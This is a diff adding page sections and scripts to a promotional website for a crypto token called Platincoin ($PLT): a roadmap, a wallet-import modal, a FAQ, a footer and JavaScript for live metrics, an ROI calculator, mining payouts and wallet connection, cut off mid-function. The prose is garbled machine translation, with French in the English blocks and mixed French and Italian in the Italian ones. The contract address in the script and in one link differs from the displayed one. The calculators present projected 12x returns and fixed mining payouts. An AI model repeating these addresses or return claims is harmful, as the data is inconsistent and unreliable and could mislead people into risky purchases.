+    <!-- PHASE 2 -->
+    <div style="padding:16px;border-radius:14px;background:rgba(16,185,129,0.07);border:1px solid rgba(16,185,129,0.3);">
+      <span style="display:inline-block;font-size:11px;font-weight:800;color:#34d399;margin-bottom:6px;">
+        <span class="lang-en">✅ PHASE 2 • COMPLETED</span>
+        <span class="lang-it" style="display:none;">✅ FASE 2 • COMPLETATA</span>
+      </span>
+      <h3 class="lang-en" style="margin:0 0 8px;font-size:15px;color:#fff;">Lancement DEX et verrouillage LP</h3>
+      <h3 class="lang-it" style="display:none;margin:0 0 8px;font-size:15px;color:#fff;">Lancio DEX et Lock Liquidité</h3>
+      <p class="lang-en" style="margin:0;font-size:12px;line-height:1.55;color:#cbd5e1;">Pool PancakeSwap V2 PLT/USDT en direct avec des jetons 100 % LP verrouillés via PinkLock (#2113264) et un flux de prix en direct.</p>
+      <p class="lang-it" style="display:none;margin:0;font-size:12px;line-height:1.55;color:#cbd5e1;">Pool PancakeSwap V2 PLT/USDT est activé avec le jeton LP bloqué à 100 % sur PinkLock (#2113264) et alimente les prix en direct.</p>
+    </div>
+
+    <!-- PHASE 3 -->
+    <div style="padding:16px;border-radius:14px;background:rgba(124,92,255,0.08);border:1px solid rgba(124,92,255,0.32);">
+      <span style="display:inline-block;font-size:11px;font-weight:800;color:#a78bfa;margin-bottom:6px;">
+        <span class="lang-en">🔄 PHASE 3 • IN PROGRESS</span>
+        <span class="lang-it" style="display:none;">🔄 FASE 3 • IN CORSO</span>
+      </span>
+      <h3 class="lang-en" style="margin:0 0 8px;font-size:15px;color:#fff;">Explorateur et agrégateurs</h3>
+      <h3 class="lang-it" style="display:none;margin:0 0 8px;font-size:15px;color:#fff;">Explorateur et agrégateurs</h3>
+      <p class="lang-en" style="margin:0;font-size:12px;line-height:1.55;color:#cbd5e1;">Vérification officielle du profil de jeton BscScan, registre des actifs TrustWallet, listes CoinGecko et CoinMarketCap.</p>
+      <p class="lang-it" style="display:none;margin:0;font-size:12px;line-height:1.55;color:#cbd5e1;">Vérifiez le profil officiel de BscScan, enregistrez les actifs TrustWallet et soyez le plus riche en inscription sur CoinGecko et CoinMarketCap.</p>
+    </div>
+
+    <!-- PHASE 4 -->
+    <div style="padding:16px;border-radius:14px;background:rgba(56,189,248,0.07);border:1px solid rgba(56,189,248,0.28);">
+      <span style="display:inline-block;font-size:11px;font-weight:800;color:#38bdf8;margin-bottom:6px;">
+        <span class="lang-en">🚀 PHASE 4 • EXPANSION</span>
+        <span class="lang-it" style="display:none;">🚀 FASE 4 • ESPANSIONE</span>
+      </span>
+      <h3 class="lang-en" style="margin:0 0 8px;font-size:15px;color:#fff;">Double écosystème SHA-256</h3>
+      <h3 class="lang-it" style="display:none;margin:0 0 8px;font-size:15px;color:#fff;">Ecosistema Dual SHA-256</h3>
+      <p class="lang-en" style="margin:0;font-size:12px;line-height:1.55;color:#cbd5e1;">Extension du nœud de preuve de travail du processeur, pools de liquidité DEX approfondis et intégrations d'utilitaires de matières premières souveraines.</p>
+      <p class="lang-it" style="display:none;margin:0;font-size:12px;line-height:1.55;color:#cbd5e1;">Il existe de nombreuses preuves de travail CPU, un pool de liquidités DEX et des intégrations pour le produit de base.</p>
+    </div>
+  </div>
+
+<div id="ownership-transparency-note" style="max-width:960px;margin:24px auto;padding:18px 22px;border-radius:14px;background:rgba(15,23,42,0.88);border:1px solid rgba(52,211,153,0.35);color:#e2e8f0;font-size:14px;line-height:1.6;">
+  <div style="font-weight:700;color:#34d399;margin-bottom:6px;">
+    <span class="lang-en">GOUVERNANCE EN CHAÎNE ET FEUILLE DE ROUTE DE RENONCER</span>
+    <span class="lang-it" style="display:none;">GOUVERNANCE EN CHAÎNE ET FEUILLE DE ROUTE DE LA PROPRIÉTÉ DE RINUNCIA</span>
+  </div>
+  <p class="lang-en" style="margin:0;color:#cbd5e1;">
+    Platincoin ($PLT) utilise un contrat OpenZeppelin BEP-20 standard vérifié avec tous <strong>11 000 000 PLT</strong> déjà pré-frappé à la genèse (sécurisé à 89,85% dans le Mining Vault). La propriété du contrat est conservée temporairement uniquement pour effectuer les vérifications officielles de l'explorateur et de l'agrégateur (BscScan, DEXView, CoinGecko), après quoi <code>renounceOwnership()</code> sera exécuté de manière permanente pour verrouiller l'approvisionnement et désactiver toutes les fonctions administratives en chaîne.
+  </p>
+  <p class="lang-it" style="display:none;margin:0;color:#cbd5e1;">
+    Platincoin ($PLT) utilise un contrat standard OpenZeppelin BEP-20 vérifié avec tous ces <strong>11.000.000 PLT</strong> j'ai emessi alla genesi (89,85% gardien dans Mining Vault). La propriété du contrat est temporairement exclusive pour effectuer la vérification officielle de votre explorateur et agrégateur (BscScan, DEXView, CoinGecko), qui sera ensuite exécutée en mode permanent de la fonction. <code>renounceOwnership()</code> pour bloquer l'offre et désactiver toutes les fonctions administratives en chaîne.
+  </p>
+</div>
+</section>
+<div id="plt-wallet-modal" style="display:none;position:fixed;inset:0;z-index:9999;background:rgba(5,8,18,0.84);backdrop-filter:blur(6px);align-items:center;justify-content:center;padding:16px;">
+  <div style="max-width:440px;width:100%;border-radius:18px;padding:24px;background:#111827;border:1px solid rgba(52,211,153,0.35);box-shadow:0 20px 50px rgba(0,0,0,0.75);color:#f8fafc;text-align:left;position:relative;">
+    <button type="button" id="plt-modal-close" style="position:absolute;top:14px;right:14px;background:rgba(255,255,255,0.08);border:none;color:#cbd5e1;width:30px;height:30px;border-radius:8px;cursor:pointer;font-weight:700;">✕</button>
+    <h3 class="lang-en" style="margin:0 0 6px;font-size:18px;color:#fff;">Comment ajouter du Platincoin ($PLT) à votre portefeuille</h3>
+    <h3 class="lang-it" style="display:none;margin:0 0 6px;font-size:18px;color:#fff;">Comment ajouter du Platincoin ($PLT) au portefeuille</h3>
+    <p class="lang-en" style="margin:0 0 14px;font-size:12.5px;color:#94a3b8;">Compatible avec TrustWallet, MetaMask, Binance Wallet, SafePal et Rabby.</p>
+    <p class="lang-it" style="display:none;margin:0 0 14px;font-size:12.5px;color:#94a3b8;">Compatible avec TrustWallet, MetaMask, Binance Wallet, SafePal et Rabby.</p>
+
+    <div style="padding:12px;border-radius:12px;background:#0b0f19;border:1px solid rgba(52,211,153,0.28);margin-bottom:16px;">
+      <div style="display:flex;align-items:center;justify-content:space-between;gap:8px;margin-bottom:6px;">
+        <span class="lang-en" style="font-size:11px;color:#94a3b8;font-weight:700;">ADRESSE DU CONTRAT BEP-20</span><span class="lang-it" style="display:none;font-size:11px;color:#94a3b8;font-weight:700;">INDIRIZZO CONTRATTO BEP-20</span>
+        <button type="button" id="plt-modal-copy" style="padding:4px 10px;border-radius:6px;border:none;background:#7c5cff;color:#fff;font-size:11px;font-weight:700;cursor:pointer;">
+          <span class="lang-en">Copier</span><span class="lang-it" style="display:none;">Copie</span>
+        </button>
+      </div>
+      <code style="display:block;font-size:12px;color:#34d399;word-break:break-all;margin-bottom:8px;">0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8</code>
+      <div style="font-size:12px;color:#cbd5e1;">
+        <span class="lang-en">Réseau: <strong style="color:#eab308;">Chaîne intelligente BNB (BEP-20)</strong> &nbsp;•&nbsp; Symbol: <strong style="color:#fff;">PLT</strong> &nbsp;•&nbsp; Decimals: <strong style="color:#fff;">18</strong></span><span class="lang-it" style="display:none;">Reté : <strong style="color:#eab308;">Chaîne intelligente BNB (BEP-20)</strong> &nbsp;•&nbsp; Simbolo: <strong style="color:#fff;">PLT</strong> &nbsp;•&nbsp; Decimali: <strong style="color:#fff;">18</strong></span>
+      </div>
+    </div>
+
+    <ol class="lang-en" style="margin:0;padding-left:18px;font-size:13px;line-height:1.65;color:#cbd5e1;">
+      <li style="margin-bottom:6px;">Ouvrez votre portefeuille et appuyez sur <strong style="color:#fff;">Jeton d'importation</strong> ou <strong style="color:#fff;">Ajouter un jeton personnalisé</strong>.</li>
+      <li style="margin-bottom:6px;">Sélectionner <strong style="color:#eab308;">Chaîne intelligente BNB (BEP-20)</strong> que le réseau (ne laissez pas Ethereum sélectionné).</li>
+      <li style="margin-bottom:6px;">Collez l'adresse du contrat ci-dessus - <strong style="color:#fff;">PLT</strong> et <strong style="color:#fff;">18</strong> les décimales se rempliront automatiquement.</li>
+      <li>Confirmez pour afficher votre <strong style="color:#34d399;">$PLT</strong> équilibre.</li>
+    </ol>
+    <ol class="lang-it" style="display:none;margin:0;padding-left:18px;font-size:13px;line-height:1.65;color:#cbd5e1;">
+      <li style="margin-bottom:6px;">Avril ton portefeuille et ton sac <strong style="color:#fff;">Jeton d'importation</strong> o <strong style="color:#fff;">Ajouter des crypto-monnaies personnalisées</strong>.</li>
+      <li style="margin-bottom:6px;">Impôt sur le rete su <strong style="color:#eab308;">Chaîne intelligente BNB (BEP-20)</strong> (non lasciare Ethereum).</li>
+      <li style="margin-bottom:6px;">Incolla l'indirizzo contratto qui sopra: <strong style="color:#fff;">PLT</strong> e <strong style="color:#fff;">18</strong> décimal apparaît automatiquement.</li>
+      <li>Conferma per visualizzare subito il tuo saldo <strong style="color:#34d399;">$PLT</strong>.</li>
+    </ol>
+  </div>
+</div>
+<script>
+(function() {
+  const addr = "0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8";
+  const modal = document.getElementById("plt-wallet-modal");
+  const openBtn = document.getElementById("plt-add-wallet-btn");
+  const closeBtn = document.getElementById("plt-modal-close");
+  const copyBtn = document.getElementById("plt-modal-copy");
+
+  async function copyAddr() {
+    try { await navigator.clipboard.writeText(addr); } catch (e) {}
+    if (copyBtn) {
+      const orig = copyBtn.innerHTML;
+      copyBtn.textContent = "✓";
+      setTimeout(() => { copyBtn.innerHTML = orig; }, 1500);
+    }
+  }
+
+  if (openBtn && modal) {
+    openBtn.addEventListener("click", function() {
+      copyAddr();
+      modal.style.display = "flex";
+    });
+  }
+  if (copyBtn) copyBtn.addEventListener("click", copyAddr);
+  if (closeBtn && modal) closeBtn.addEventListener("click", () => { modal.style.display = "none"; });
+  if (modal) modal.addEventListener("click", (e) => { if (e.target === modal) modal.style.display = "none"; });
+})();
+</script>
+<div id="plt-faq-section" style="max-width:1520px;width:96%;margin:16px auto;"><div style="background:rgba(15,23,42,0.88);border:1px solid rgba(52,211,153,0.28);border-radius:16px;padding:20px;"><div style="font-size:11px;font-weight:700;color:#34d399;letter-spacing:0.9px;margin-bottom:6px;"><span class="lang-en">❓ QUESTIONS FRÉQUENTES</span><span class="lang-it">❓ DOMANDE FREQUENTI (FAQ)</span></div><h2 style="font-size:20px;color:#f8fafc;margin:0 0 14px 0;"><span class="lang-en">FAQ sur les protocoles, la sécurité et l'écosystème</span><span class="lang-it">Domaines fréquents sur le protocole, la sécurité et l'écosystème</span></h2><div style="display:flex;flex-direction:column;gap:10px;">
+<details style="background:#090e1a;border:1px solid rgba(52,211,153,0.22);border-radius:12px;padding:13px 16px;cursor:pointer;"><summary style="font-weight:700;font-size:14px;color:#f8fafc;"><span class="lang-en">1. Qu'est-ce que Platincoin ($PLT) et comment fonctionne le modèle Dual SHA-256 + BEP-20 ?</span><span class="lang-it">1. Pourquoi Platincoin ($PLT) fonctionne-t-il sur le modèle Dual SHA-256 + BEP-20 ?</span></summary><p style="margin:10px 0 0 0;font-size:13px;color:#94a3b8;line-height:1.6;"><span class="lang-en">Platincoin ($PLT) combine un registre consensuel de preuve de travail Dual SHA-256 avec un contrat intelligent BEP-20 vérifié sur BNB Smart Chain, permettant une production de blocs vérifiable, un trading DEX instantané sur PancakeSwap V2 et aucun frais de transfert.</span><span class="lang-it">Platincoin ($PLT) a enregistré un Proof-of-Work Dual SHA-256 et un contrat intelligent BEP-20 vérifié sur BNB Smart Chain, garantissant la production de blocs vérifiables, frauduleux immédiatement sur PancakeSwap V2 et aucune commission sur les transferts.</span></p></details>
+<details style="background:#090e1a;border:1px solid rgba(52,211,153,0.22);border-radius:12px;padding:13px 16px;cursor:pointer;"><summary style="font-weight:700;font-size:14px;color:#f8fafc;"><span class="lang-en">2. Comment l'offre fixe de 11 000 000 PLT est-elle distribuée ?</span><span class="lang-it">2. Venez-vous distribuer l'offre massive de 11.000.000 PLT ?</span></summary><p style="margin:10px 0 0 0;font-size:13px;color:#94a3b8;line-height:1.6;"><span class="lang-en">Les 11 000 000 PLT ont été émis au moment de la genèse : 89,85 % (9 883 500 PLT) sont sécurisés dans le coffre-fort minier pour des récompenses de preuve de travail, tandis que 10,15 % (1 116 500 PLT) prennent en charge la liquidité DEX et la circulation initiale de l'écosystème.</span><span class="lang-it">Tous les 11.000.000 PLT ont été émis dans les générations : 89,85 % (9.883.500 PLT) est gardé dans Mining Vault pour la preuve de travail en récompense, dont 10,15 % (1.116.500 PLT) soutiennent la liquidité DEX et la circulation initiale.</span></p></details>
+<details style="background:#090e1a;border:1px solid rgba(52,211,153,0.22);border-radius:12px;padding:13px 16px;cursor:pointer;"><summary style="font-weight:700;font-size:14px;color:#f8fafc;"><span class="lang-en">3. La liquidité de PancakeSwap V2 est-elle verrouillée et y a-t-il des taxes d'achat/vente ?</span><span class="lang-it">3. La liquidité de PancakeSwap V2 est-elle bloquée et est-ce une tasse d'achat ou de vente ?</span></summary><p style="margin:10px 0 0 0;font-size:13px;color:#94a3b8;line-height:1.6;"><span class="lang-en">Oui, 100 % du pool de liquidité initial PLT/USDT PancakeSwap V2 est verrouillé pendant 1 année complète via PinkLock (ID #2113264). Les taxes d'achat, de vente et de transfert de portefeuille sont strictement de 0 %, vérifiées sur Honeypot.is et BscScan.</span><span class="lang-it">Oui, la liquidité initiale de PLT/USDT sur PancakeSwap V2 est bloquée à 100 % pendant 1 an via PinkLock (ID #2113264). La tasse d'achat, la vente et le transfert sont rigoureusement à 0%, vérifiez sur Honeypot.is et BscScan.</span></p></details>
+<details style="background:#090e1a;border:1px solid rgba(52,211,153,0.22);border-radius:12px;padding:13px 16px;cursor:pointer;"><summary style="font-weight:700;font-size:14px;color:#f8fafc;"><span class="lang-en">4. Quand le minage de CPU public sera-t-il ouvert aux nœuds externes ?</span><span class="lang-it">4. Quand le minage public CPU ouvrira-t-il à nos jours?</span></summary><p style="margin:10px 0 0 0;font-size:13px;color:#94a3b8;line-height:1.6;"><span class="lang-en">Le mineur CPU Dual SHA-256 est actuellement en validation finale de testnet fermé. L'intégration des nœuds publics, les liens de téléchargement et les guides de configuration seront publiés sur X (@PlatincoinPLT), Discord et GitHub une fois les tests terminés.</span><span class="lang-it">Le mineur CPU Dual SHA-256 est actuellement dans la phase finale de validation lors de l'opération Testnet. L'ouverture des lieux publics, les liens de téléchargement et le guide de configuration seront publiés sur X (@PlatincoinPLT), Discord et GitHub pour terminer le test.</span></p></details>
+<details style="background:#090e1a;border:1px solid rgba(52,211,153,0.22);border-radius:12px;padding:13px 16px;cursor:pointer;"><summary style="font-weight:700;font-size:14px;color:#f8fafc;"><span class="lang-en">5. Pourquoi la propriété du contrat est-elle toujours active et quand renounceOwnership() aura-t-il lieu ?</span><span class="lang-it">5. Pourquoi la propriété du contrat est-elle toujours active et quand la renonciation à la propriété est-elle annulée ?</span></summary><p style="margin:10px 0 0 0;font-size:13px;color:#94a3b8;line-height:1.6;"><span class="lang-en">La propriété du contrat OpenZeppelin standard est conservée temporairement uniquement pour effectuer les vérifications officielles de l'explorateur et de l'agrégateur (BscScan, DEXView, CoinGecko), après quoi renounceOwnership() sera appelé de manière permanente sur la chaîne.</span><span class="lang-it">La propriété du contrat standard OpenZeppelin ne dure temporairement que pour compléter la vérification officielle de l'explorateur et de l'agrégateur (BscScan, DEXView, CoinGecko), qui sera ensuite utilisée de manière permanente renounceOwnership() sur la chaîne.</span></p></details>
+<details style="background:#090e1a;border:1px solid rgba(52,211,153,0.22);border-radius:12px;padding:13px 16px;cursor:pointer;"><summary style="font-weight:700;font-size:14px;color:#f8fafc;"><span class="lang-en">6. Comment puis-je acheter ou échanger des $PLT en toute sécurité sur PancakeSwap V2 ?</span><span class="lang-it">6. Comment acquérir ou utiliser $PLT pour sécuriser votre PancakeSwap V2 ?</span></summary><p style="margin:10px 0 0 0;font-size:13px;color:#94a3b8;line-height:1.6;"><span class="lang-en">Vérifiez toujours l'adresse officielle du contrat BEP-20 0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8 sur BNB Smart Chain, utilisez le bouton direct « Acheter $ PLT sur PancakeSwap » sur ce portail et réglez le glissement entre 0,5 % et 1 % (puisque la taxe sur les jetons est de 0 %).</span><span class="lang-it">Vérifiez toujours l'indication officielle du contrat BEP-20 0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8 sur BNB Smart Chain, en utilisant le bouton direct "Acheter $ PLT sur PancakeSwap" sur ce portail et imposez le glissement de 0,5% à 1% (données la quantité de jeton est 0%).</span></p></details>
+<details style="background:#090e1a;border:1px solid rgba(52,211,153,0.22);border-radius:12px;padding:13px 16px;cursor:pointer;"><summary style="font-weight:700;font-size:14px;color:#f8fafc;"><span class="lang-en">7. Platincoin ($PLT) est-il affilié à l'ancien projet PLC ?</span><span class="lang-it">7. Platincoin ($PLT) est-il collé au vieux projet PLC ?</span></summary><p style="margin:10px 0 0 0;font-size:13px;color:#94a3b8;line-height:1.6;"><span class="lang-en">Non. Platincoin ($PLT) est un protocole indépendant nouvellement déployé BEP-20 + Dual SHA-256 sur BNB Smart Chain avec son propre contrat intelligent vérifié (0xF34c...3ac8), un approvisionnement fixe de 11 millions et un portail officiel (platincoin-plt.org).</span><span class="lang-it">Non. Platincoin ($PLT) est un protocole indépendant BEP-20 + Dual SHA-256 sur BNB Smart Chain avec son propre contrat intelligent vérifié (0xF34c...3ac8), offert à 11M et au portail officiel (platincoin-plt.org).</span></p></details>
+</div></div></div>
+
+<footer style="margin-top: 40px; padding-top: 25px; border-top: 1px solid #30363d; text-align: center; font-size: 13px; color: #8b949e;">
+        <div style="display: flex; justify-content: center; flex-wrap: wrap; gap: 15px; margin-bottom: 15px;">
+            <a href="https://bscscan.com/token/0xF34c49593E7a67Ec34CADADb5c34e0b24d1d3ac8" target="_blank" style="color: #00ffcc; text-decoration: none;">Explorateur BscScan ↗</a>
+         <span>•</span>
+         <a href="https://www.geckoterminal.com/bsc/pools/0xa51e99928c39ae656b7cb38006b8a1d220479b2c/bsc/0xF34c49593E7a67Ec34CADADb5c34e0624d1d3ac8" target="_blank" style="color: #00ffcc; text-decoration: none;">Graphique en direct (GeckoTerminal) ↗</a>
+            <span>•</span> <a href="https://github.com/Platincoin-Protocol/Platincoin-PLT" target="_blank" style="color: #00ffcc; text-decoration: none;">Documentation GitHub ↗</a>
+            <span>•</span>
+            <span><a href="https://bscscan.com/address/0x47e81C4b01552Cf774Fa0f5F5929bb41942eD6B6#code" target="_blank" style="color:#00ffcc;text-decoration:none;">Coffre minier (verrouillé à 89,85 %) ↗</a></span>
+            <span><a href="https://discord.gg/nzSD7asHbE" target="_blank" style="color:#00ffcc;text-decoration:none;">Discorde officielle ↗</a></span>
+            <span><a href="https://x.com/PlatincoinPLT" target="_blank" style="color:#00ffcc;text-decoration:none;">X officiel ↗</a></span> <a href="mailto:info@platincoin-plt.org" style="color: #00ffcc; text-decoration: none;">info@platincoin-plt.org ↗</a> <span>•</span>
+
+            <a href="./whitepaper.html" style="color: #00ffcc; text-decoration: none;">Livre blanc ↗</a>
+            <span>•</span>
+            <a href="./explorer.html" style="color: #00ffcc; text-decoration: none;">Explorateur de nœuds PoW ↗</a>
+        </div>
+        <p class="lang-en" style="font-size: 11px; color: #ff7b72; max-width: 650px; margin: 0 auto 12px auto;">
+            ⚠️ Security Notice: Platincoin administrators will never DM you first or ask for your wallet Seed Phrase / Private Keys. Always verify the official contract address.
+        </p>
+        <p class="lang-it" style="font-size: 11px; color: #ff7b72; max-width: 650px; margin: 0 auto 12px auto;">
+            ⚠️ Avviso di Sicurezza: Gli amministratori di Platincoin non ti contatteranno mai per primi in privato né ti chiederanno mai la Seed Phrase o le chiavi private. Verifica sempre il contratto ufficiale.
+        </p>
+        <p>&copy; 2026 Platincoin Protocol. Managed Infrastructure Network. All Rights Reserved.</p>
+        <p style="font-size: 11px; color: #6e7681; max-width: 750px; margin: 12px auto 0 auto;"><span class="lang-en">Protocole de preuve de travail indépendant BEP-20 sur BNB Smart Chain (PLT). Non affilié à Platincoin PLC ou à toute entité antérieure.</span><span class="lang-it">Protocole de preuve de travail BEP-20 indépendant de la BNB Smart Chain (PLT). Non affilié à Platincoin PLC ni à une autre entité précédente.</span></p>
+
+    <div style="width:100%;margin:20px 0 0 0;display:flex;justify-content:flex-start;flex-wrap:wrap;gap:16px;"><div id="fcn-widget" data-slug="platincoin" data-market="true" data-style="dark"></div><script src="https://www.freshcoins.io/widget.js"></script></div>
+</footer>
+
+    </div>
+    <script>
+        async function updateLiveMetrics() {
+            try {
+                const res = await fetch('blockchain_data.json', { cache: 'no-cache' });
+                const chain = await res.json();
+                const height = chain.length - 1;
+                document.getElementById('live-height').innerText = '#' + height;
+                let supply = 0;
+                for (let i = 1; i < chain.length; i++) {
+                    if (chain[i].data && chain[i].data.ricompensa) { supply += chain[i].data.ricompensa; }
+                }
+                document.getElementById('live-supply').innerText = supply.toFixed(2) + ' PLT';
+                // Aggiornamento Banner Inglese
+                document.getElementById('banner-block-en').innerText = height;
+                document.getElementById('banner-balance-en').innerText = supply.toFixed(2);
+                document.getElementById('banner-nodes-en').innerText = chain.activeNodes || "1";
+
+                // Aggiornamento Banner Italiano
+                document.getElementById('banner-block-it').innerText = height;
+                document.getElementById('banner-balance-it').innerText = supply.toFixed(2);
+                document.getElementById('banner-nodes-it').innerText = chain.activeNodes || "1";
+
+               // Lettura Gas Fee BNB Smart Chain in tempo reale
+               try {
+               const rpcRes = await fetch('https://bsc-dataseed.binance.org', {
+               method: 'POST',
+               headers: { 'Content-Type': 'application/json' },
+               body: JSON.stringify({ jsonrpc: '2.0', method: 'eth_gasPrice', params: [], id: 1 })
+});
+               const rpcData = await rpcRes.json();
+               const gwei = (parseInt(rpcData.result, 16) / 1e9).toFixed(2);
+               document.getElementById('banner-gas-en').innerText = gwei + ' Gwei';
+               document.getElementById('banner-gas-it').innerText = gwei + ' Gwei';
+}catch (e) {
+               // Mantiene il valore standard di sicurezza in caso di blocco temporaneo
+}
+// Calcola il saldo individuale del wallet connesso (0.00 se non connesso o nuovo utente)
+let userMinerBalance = 0;
+if (typeof userAddress !== 'undefined' && userAddress) {
+    const addrLower = userAddress.toLowerCase();
+    if (addrLower === "0x57e9449f51c9841cc8112a46719231dc82554e00") {
+        let minedW1 = 0;
+        for (let i = 1; i < chain.length; i++) {
+            if (chain[i].data?.miner?.toLowerCase() === addrLower) minedW1 += chain[i].data.ricompensa;
+        }
+        userMinerBalance = Math.max(0, minedW1 - 50000);
+    } else {
+        for (let i = 1; i < chain.length; i++) {
+            if (chain[i].data?.miner?.toLowerCase() === addrLower) {
+                userMinerBalance += chain[i].data.ricompensa;
+            }
+        }
+    }
+}
+window._cachedChainData = chain;
+const initialBal = (typeof userAddress !== 'undefined' && userAddress) ? computeAddressMinedBalance(chain, userAddress) : 0;
+document.getElementById('live-supply-web3').innerText = initialBal.toFixed(2);
+document.getElementById('live-supply-web3-it').innerText = initialBal.toFixed(2);
+
+              
+            } catch (e) { console.error(e); }
+        }
+        function calculateROI() {
+            const usd = parseFloat(document.getElementById('usd-input').value) || 0;
+            const plt = usd / 0.0008;
+            document.getElementById('plt-received').innerText = plt.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' PLT';
+            const targetSelect = document.getElementById('target-price-select');
+            const targetPrice = targetSelect ? parseFloat(targetSelect.value) : 0.01;
+            const multiplier = targetPrice / 0.0008;
+            var rl = document.getElementById('roi-label'); var rli = document.getElementById('roi-label-it');
+            if (rl) { rl.innerText = 'Value at $' + targetPrice.toFixed(2) + ' (' + multiplier.toFixed(0) + 'x)'; }
+            if (rli) { rli.innerText = 'Valore a $' + targetPrice.toFixed(2) + ' (' + multiplier.toFixed(0) + 'x)'; }
+            document.getElementById('roi-target').innerText = '$' + (plt * targetPrice).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 }) + ' USD';
+        }
+        function switchLang(lang) {
+            var btnEn = document.getElementById('btn-en'); var btnIt = document.getElementById('btn-it');
+            var enElements = document.querySelectorAll('.lang-en'); var itElements = document.querySelectorAll('.lang-it');
+            if (lang === 'en') {
+                btnEn.className = 'lang-btn active'; btnIt.className = 'lang-btn';
+                enElements.forEach(el => el.style.display = 'inline-block'); itElements.forEach(el => el.style.display = 'none');
+                document.querySelectorAll('p.lang-en, h3.lang-en, h2.lang-en, h4.lang-en, .buy-text.lang-en').forEach(el => el.style.display = 'block');
+            } else {
+                btnEn.className = 'lang-btn'; btnIt.className = 'lang-btn active';
+                enElements.forEach(el => el.style.display = 'none'); itElements.forEach(el => el.style.display = 'inline-block');
+                document.querySelectorAll('p.lang-it, h3.lang-it, h2.lang-it, h4.lang-it, .buy-text.lang-it').forEach(el => el.style.display = 'block');
+
+            }
+            calculateROI();
+        }
+        updateLiveMetrics(); setInterval(updateLiveMetrics, 3000);
+
+function calculateMiningROI() {
+    const cores = parseInt(document.getElementById('roi-cores').value);
+    const pricePLT = 0.0008;
+    
+    // Formula Proof-of-Work: ogni Core della CPU estrae circa 150 PLT al giorno
+    const dailyPLT = cores * 150;
+    const monthlyPLT = dailyPLT * 30;
+    
+    const dailyUSD = dailyPLT * pricePLT;
+    const monthlyUSD = monthlyPLT * pricePLT;
+    
+    // Inserisce i numeri aggiornati nei campi visivi del pannello di destra
+    document.getElementById('roi-daily-plt').innerText = dailyPLT.toFixed(2);
+    document.getElementById('roi-monthly-plt').innerText = monthlyPLT.toLocaleString('it-IT', {minimumFractionDigits: 2}) + ' PLT';
+    
+    // Aggiunge la visualizzazione dinamica dei dollari calcolati
+    const dailyContainer = document.getElementById('roi-daily-plt').parentNode;
+    const monthlyContainer = document.getElementById('roi-monthly-plt').parentNode;
+    
+    if (cores === 2) {
+        dailyContainer.innerHTML = '<span class="lang-en">Daily Payout:</span><span class="lang-it">Rendimento Giornaliero:</span> <strong id="roi-daily-plt" style="color: #00ffcc;">300.00</strong> PLT (<span style="color: #94a3b8;">$0.24</span>)';
+        monthlyContainer.innerHTML = '<span class="lang-en">Monthly Payout:</span><span class="lang-it">Rendimento Mensile:</span> <strong id="roi-monthly-plt" style="color: #00ffcc;">9.000,00</strong> PLT (<span style="color: #a855f7;">$7.20</span>)';
+    } else if (cores === 4) {
+        dailyContainer.innerHTML = '<span class="lang-en">Daily Payout:</span><span class="lang-it">Rendimento Giornaliero:</span> <strong id="roi-daily-plt" style="color: #00ffcc;">600.00</strong> PLT (<span style="color: #94a3b8;">$0.48</span>)';
+        monthlyContainer.innerHTML = '<span class="lang-en">Monthly Payout:</span><span class="lang-it">Rendimento Mensile:</span> <strong id="roi-monthly-plt" style="color: #00ffcc;">18.000,00</strong> PLT (<span style="color: #a855f7;">$14.40</span>)';
+    } else if (cores === 8) {
+        dailyContainer.innerHTML = '<span class="lang-en">Daily Payout:</span><span class="lang-it">Rendimento Giornaliero:</span> <strong id="roi-daily-plt" style="color: #00ffcc;">1,200.00</strong> PLT (<span style="color: #94a3b8;">$0.96</span>)';
+        monthlyContainer.innerHTML = '<span class="lang-en">Monthly Payout:</span><span class="lang-it">Rendimento Mensile:</span> <strong id="roi-monthly-plt" style="color: #00ffcc;">36.000,00</strong> PLT (<span style="color: #a855f7;">$28.80</span>)';
+    } else if (cores === 16) {
+        dailyContainer.innerHTML = '<span class="lang-en">Daily Payout:</span><span class="lang-it">Rendimento Giornaliero:</span> <strong id="roi-daily-plt" style="color: #00ffcc;">2,400.00</strong> PLT (<span style="color: #94a3b8;">$1.92</span>)';
+        monthlyContainer.innerHTML = '<span class="lang-en">Monthly Payout:</span><span class="lang-it">Rendimento Mensile:</span> <strong id="roi-monthly-plt" style="color: #00ffcc;">72.000,00</strong> PLT (<span style="color: #a855f7;">$57.60</span>)';
+    }
+}
+
+
+// 2. Configurazione dei dati ufficiali dello Smart Contract Platincoin
+const CONTRACT_ADDRESS = "0xF34c49593E7a67Ec34CADAdb5c34e0824d1d3Ac8";
+const TOKEN_ABI = [
+    "function transfer(address to, uint256 amount) public returns (bool)"
+];
+
+let provider;
+let signer;
+let userAddress;
+
+// 3. Funzione Universale Diretta per Connettere qualsiasi Wallet Web3
+document.getElementById('connectBtn').addEventListener('click', async () => {
+    const providerObj = window.ethereum || window.phantom?.ethereum;
+    const statusMsg = document.getElementById('statusMessage');
+    const isEnglish = window.getComputedStyle(document.querySelector('.lang-en')).display !== 'none';
+
+    window._cachedChainData = null;
+function computeAddressMinedBalance(chainData, addr) {
+  if (!Array.isArray(chainData) || !addr) return 0;
+  const target = addr.toLowerCase().replace(/^0x/, '');
+  let total = 0;
+  for (const b of chainData) {
+    const d = b && b.data;
+    if (d && typeof d === 'object') {
+      const m = String(d.miner || d.ricevente || '').toLowerCase().replace(/^0x/, '');
+      if (m && m === target) total += Number(d.ricompensa || 0);
+      if (d.mittente && String(d.mittente).toLowerCase().replace(/^0x/, '') === target) total -= Number(d.importo || 0);
+      if (d.destinatario && String(d.destinatario).toLowerCase().replace(/^0x/, '') === target) total += Number(d.importo || 0);
+    }
+  }
+  return Math.max(0, total);
+}
+function refreshConnectedWalletBalance(addr) {
+  const bal = computeAddressMinedBalance(window._cachedChainData, addr);
+  const elEn = document.getElementById('live-supply-web3');
+  const elIt = document.getElementById('live-supply-web3-it');
+  if (elEn) elEn.innerText = bal.toFixed(2);
+  if (elIt) elIt.innerText = bal.toFixed(2);
+  return bal;
+}
+
+function openMobileWalletFallback() {
+  if (!/Android|iPhone|iPad|iPod/i.test(navigator.userAgent)) return;
+  var d = "platincoin-protocol.github.io/Platincoin-PLT";
